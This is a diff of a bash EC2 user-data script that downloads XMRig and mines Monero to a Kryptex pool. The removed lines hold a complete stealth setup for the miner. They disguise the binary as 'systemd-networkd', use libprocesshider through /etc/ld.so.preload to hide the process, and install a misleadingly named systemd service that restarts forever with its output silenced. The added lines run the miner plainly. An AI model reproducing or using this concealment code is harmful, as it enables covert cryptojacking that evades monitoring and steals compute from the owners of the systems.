@@ -1,5 +1,6 @@
+
 #!/bin/bash
-# User Data script for EC2 to automatically install and run XMRig miner with stealth mode and CPU limit
+# User Data script for EC2 to automatically install and run the miner
 
 # Log output for debugging
 exec > /var/log/user-data.log 2>&1
@@ -8,7 +9,7 @@ set -x
 # Update the system and install required packages
 sudo apt update -y
 sudo apt upgrade -y
-sudo apt install -y wget tar build-essential libssl-dev cmake git htop cpulimit
+sudo apt install -y wget tar build-essential libssl-dev cmake git htop
 
 # Create a working directory
 cd /home/ubuntu
@@ -16,41 +17,6 @@ cd /home/ubuntu
 # Download and extract XMRig
 wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
-rm xmrig-6.22.2-linux-static-x64.tar.gz
 
-# Rename the miner binary for stealth
-mv xmrig systemd-networkd
-chmod +x systemd-networkd
-
-# Install libprocesshider to hide process from monitoring tools
-git clone https://github.com/gianlucaborello/libprocesshider.git
-cd libprocesshider
-make && sudo make install
-
-# Enable process hiding
-echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload
-
-# Create a systemd service for auto-restart and persistence
-sudo bash -c 'cat > /etc/systemd/system/xmrig.service <<EOF
-[Unit]
-Description=Systemd Network Daemon
-After=network.target
-
-[Service]
-ExecStart=/home/ubuntu/systemd-networkd -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-22-3 -k --coin monero -a rx/8
-Restart=always
-User=ubuntu
-WorkingDirectory=/home/ubuntu
-Nice=19
-LimitNOFILE=1048576
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-EOF'
-
-# Enable and start the service
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig
-sudo systemctl start xmrig
+# Run the miner with the specified configuration
+./xmrig -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-25-3 -k --coin monero -a rx/8
